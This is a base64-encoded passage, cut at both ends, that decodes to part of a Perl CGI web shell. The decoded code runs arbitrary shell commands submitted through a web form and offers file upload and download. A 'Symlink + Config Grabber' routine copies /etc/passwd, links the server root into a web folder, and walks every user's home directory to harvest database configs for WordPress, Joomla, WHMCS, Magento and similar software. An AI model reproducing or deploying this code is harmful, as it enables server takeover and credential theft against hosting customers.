ltYXJnaW46MCAxMHB4Ow0KCWZvbnQtZmFtaWx5OkhvbWVuYWplOw0KCWZvbnQtc2l6ZToxM3B4Ow0KCWJvcmRlcjpub25lOw0KDQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IjJkMmIyYiIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4NCjxkaXYgaWQ9Im5hdiI+DQo8YSBjbGFzcz0ibmF2LWZva3VzIiBocmVmPSIkU2NyaXB0TG9jYXRpb24/Ij48Yj5Ib21lPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWhlbHAiPjxiPkhlbHA8L2I+PC9hPg0KPGEgY2xhc3M9Im5hdi1mb2t1cyIgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkIj48Yj5VcGxvYWQ8L2I+PC9hPg0KPGEgY2xhc3M9Im5hdi1mb2t1cyIgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQiPjxiPkRvd25sb2FkPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXN5bWNvbmZpZyI+PGI+U3ltbGluayArIENvbmZpZyBHcmFiYmVyPC9iPjwvYT48L2Rpdj4NCjxicj4NCjxmb250IGNvbG9yPSJsaW1lIiBzaXplPSIzIj4NCkVORA0KfQ0Kc3ViIFByaW50UGFnZUZvb3Rlcg0Kew0KcHJpbnQgIjwvZm9udD48L2JvZHk+PC9odG1sPiI7DQp9DQoNCnN1YiBHZXRDb29raWVzDQp7DQpAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykNCnsNCigkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCiRDb29raWVzeyRpZH0gPSAkdmFsOw0KfQ0KfQ0KDQpzdWIgUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybQ0Kew0KJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQogICAgcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSI/Ij4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJjb21tYW5kIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQokUHJvbXB0DQo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iYyI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQ0Kew0KJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+PGNlbnRlcj48YnI+DQo8Zm9udCBjb2xvcj1saW1lPjxiPjxpPjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjwvZm9ybT4NCjwvaT48L2I+PC9mb250PjwvY2VudGVyPg0KPC9jb2RlPg0KRU5EDQp9DQoNCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtDQp7DQokUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+PGJyPjxjZW50ZXI+PGZvbnQgY29sb3I9bGltZT48Yj48aT48Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCiRQcm9tcHQgdXBsb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiA8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPg0KT3ZlcndyaXRlIGlmIGl0IEV4aXN0czxicj48YnI+DQpVcGxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9InVwbG9hZCI+DQo8L2Zvcm0+PC9pPjwvYj48L2ZvbnQ+DQo8L2NlbnRlcj4NCjwvY29kZT4NCkVORA0KfQ0KDQpzdWIgQ29tbWFuZFRpbWVvdXQNCnsNCmlmKCEkV2luTlQpDQp7DQphbGFybSgwKTsNCnByaW50IDw8RU5EOw0KPC94bXA+DQo8Y29kZT4NCkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS4NCjxicj5LaWxsZWQgaXQhDQo8Y29kZT4NCkVORA0KJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KZXhpdDsNCn0NCn0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KICAgaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZA0KICAgIHsNCiAgICAgICAgIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQ0KICAgICAgICAjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4NCiAgICAgICANCiAgICAgICAgJE9sZERpciA9ICRDdXJyZW50RGlyOw0KICAgICAgICAkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQogICAgICAgIGNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCiAgICAgICAgJlByaW50UGFnZUhlYWRlcigiYyIpOw0KICAgICAgICAkUHJvbXB0ID0gJFdpbk5UID8gIiRPbGREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkT2xkRGlyXVwkICI7DQogICAgICAgIHByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPiI7DQogICAgfQ0KICAgIGVsc2UgIyBzb21lIG90aGVyIGNvbW1hbmQsIGRpc3BsYXkgdGhlIG91dHB1dA0KICAgIHsNCiAgICAgICAgJlByaW50UGFnZUhlYWRlcigiYyIpOw0KICAgICAgICAkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCiAgICAgICAgcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+PHhtcD4iOw0KICAgICAgICAkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQogICAgICAgIGlmKCEkV2luTlQpDQogICAgICAgIHsNCiAgICAgICAgICAgICRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7DQogICAgICAgICAgICBhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQogICAgICAgIH0NCiAgICAgICAgaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZA0KICAgICAgICB7DQogICAgICAgICAgICAkfD0xOw0KICAgICAgICAgICAgJENvbW1hbmQgLj0gIiB8IjsNCiAgICAgICAgICAgIG9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KICAgICAgICAgICAgd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICRfID1+IHMvKFxufFxyXG4pJC8vOw0KICAgICAgICAgICAgICAgIHByaW50ICIkX1xuIjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICR8PTA7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzDQogICAgICAgIHsNCiAgICAgICAgICAgIHByaW50IGAkQ29tbWFuZGA7DQogICAgICAgIH0NCiAgICAgICAgaWYoISRXaW5OVCkNCiAgICAgICAgew0KICAgICAgICAgICAgYWxhcm0oMCk7DQogICAgICAgIH0NCiAgICAgICAgcHJpbnQgIjwveG1wPiI7DQogICAgfQ0KICAgICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KICAgICZQcmludFBhZ2VGb290ZXI7DQp9DQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlDQp7DQpsb2NhbCgkRmlsZVVybCkgPSBAXzsNCmlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cw0Kew0KIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3Nlcg0KJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsNCiZQcmludFBhZ2VIZWFkZXIoImMiKTsNCnByaW50IDw8RU5EOw0KPGNvZGU+DQpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4NCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LA0KPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4uDQo8L2NvZGU+DQpFTkQNCiZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCmVsc2UgIyBmaWxlIGRvZXNuJ3QgZXhpc3QNCnsNCiZQcmludFBhZ2VIZWFkZXIoImYiKTsNCnByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhPC9jb2RlPiI7DQomUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCnN1YiBTeW1Db25maWcNCnsNCiMhL3Vzci9iaW4vcGVybCAtSS91c3IvbG9jYWwvYmFuZG1pbg0KdXNlIEZpbGU6OkNvcHk7IHVzZSBzdHJpY3Q7IHVzZSB3YXJuaW5nczsgdXNlIE1JTUU6OkJhc2U2NDsNCm15ICRmaWxlbmFtZSA9ICdwYXNzd2QudHh0JzsNCmlmICghLWUgJGZpbGVuYW1lKSB7IGNvcHkoIi9ldGMvcGFzc3dkIiwicGFzc3dkLnR4dCIpIDsNCn0NCm1rZGlyICJzeW1saW5rX2NvbmZpZyI7DQpzeW1saW5rKCIvIiwic3ltbGlua19jb25maWcvcm9vdCIpOw0KbXkgJGh0YWNjZXNzID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCamIyNDNaWGgwTG1oMGJRMEtRV1JrVkhsd1pTQjBaWGgwTDNCc1lXbHVJQzV3YUhBZ0RRcEJaR1JJWVc1a2JHVnlJSFJsZUhRdmNHeGhhVzRnTG5Cb2NBMEtVMkYwYVhObWVTQkJibmtOQ2tsdVpHVjRUM0IwYVc5dWN5QXJRMmhoY25ObGREMVZWRVl0T0NBclJtRnVZM2xKYm1SbGVHbHVaeUFyU1dkdWIzSmxRMkZ6WlNBclJtOXNaR1Z5YzBacGNuTjBJQ3RZU0ZSTlRDQXJTRlJOVEZSaFlteGxJQ3RUZFhCd2NtVnpjMUoxYkdWeklDdFRkWEJ3Y21WemMwUmxjMk55YVhCMGFXOXVJQ3RPWVcxbFYybGtkR2c5S2lBTkNrbHVaR1Y0U1dkdWIzSmxJQ291ZEhoME5EQTBEUXBTWlhkeWFYUmxSVzVuYVc1bElFOXVEUXBTWlhkeWFYUmxRMjl1WkNBbGUxSkZVVlZGVTFSZlJrbE1SVTVCVFVWOUlGNHVLbk41Yld4cGJtdGZZMjl1Wm1sbklGdE9RMTBOQ2xKbGQzSnBkR1ZTZFd4bElGd3VkSGgwSkNBbGUxSkZVVlZGVTFSZlZWSkpmVFF3TkNCYlRDeFNQVE13TWk1T1ExMD0iKTsNCm15ICR4c3ltNDA0ID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCamIyNDNaWGgwTG1oMGJRMEtTR1ZoWkdWeVRtRnRaU0J3Y0hFdWRIaDBEUXBUWVhScGMyWjVJRUZ1ZVEwS1NXNWtaWGhQY0hScGIyNXpJRWxuYm05eVpVTmhjMlVnUm1GdVkzbEpibVJsZUdsdVp5QkdiMnhrWlhKelJtbHljM1FnVG1GdFpWZHBaSFJvUFNvZ1JHVnpZM0pwY0hScGIyNVhhV1IwYUQwcUlGTjFjSEJ5WlhOelNGUk5URkJ5WldGdFlteGxEUXBKYm1SbGVFbG5ibTl5WlNBcSIpOw0Kb3BlbihteSAkZmgxLCAnPicsICdzeW1saW5rX2NvbmZpZy8uaHRhY2Nlc3MnKTsgcHJpbnQgJGZoMSAiJGh0YWNjZXNzIjsgY2xvc2UgJGZoMTsgb3BlbihteSAkeHgsICc+JywgJ3N5bWxpbmtfY29uZmlnL25lbXUudHh0Jyk7IHByaW50ICR4eCAiJHhzeW00MDQiOyBjbG9zZSAkeHg7IG9wZW4obXkgJGZoLCAnPDplbmNvZGluZyhVVEYtOCknLCAkZmlsZW5hbWUpOyB3aGlsZSAobXkgJHJvdyA9IDwkZmg+KSB7IG15IEBtYXRjaGVzID0gJHJvdyA9fiAvKC4qPyk6eDovZzsgbXkgJHVzZXJueWEgPSAkMTsgbXkgQGFycmF5ID0gKCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvLmFjY2Vzc2hhc2gnLCB0eXBlID0+ICdXSE0tYWNjZXNzaGFzaCcgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsIHR5cGUgPT4gJ0xva29tZWRpYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywgdHlwZSA9PiAnQmFsaXRiYW5nJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCB0eXBlID0+ICdQcmVzdGFTaG9wJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwL2V0Yy9sb2NhbC54bWwnLCB0eXBlID0+ICdNYWdlbnRvJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsIHR5cGUgPT4gJ09wZW5DYXJ0JyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwbGljYXRpb24vY29uZmlnL2RhdGFiYXNlLnBocCcsIHR5cGUgPT4gJ0VsbGlzbGFiJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dwL3Rlc3Qvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BvcnRhbC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dQL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RlbW8vd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YxL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92Mi93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmxvZy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdeV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iZXRhL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcG9ydGFsL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZGVtby9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3Rlc3QvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92MS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YyL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV0hNQ1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htY3MxL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITUMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NVUFBPUlRFUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc3VwcG9ydGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RvbWFpbnMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZG9tYWluL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hvc3Rpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSE9TVElORy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdW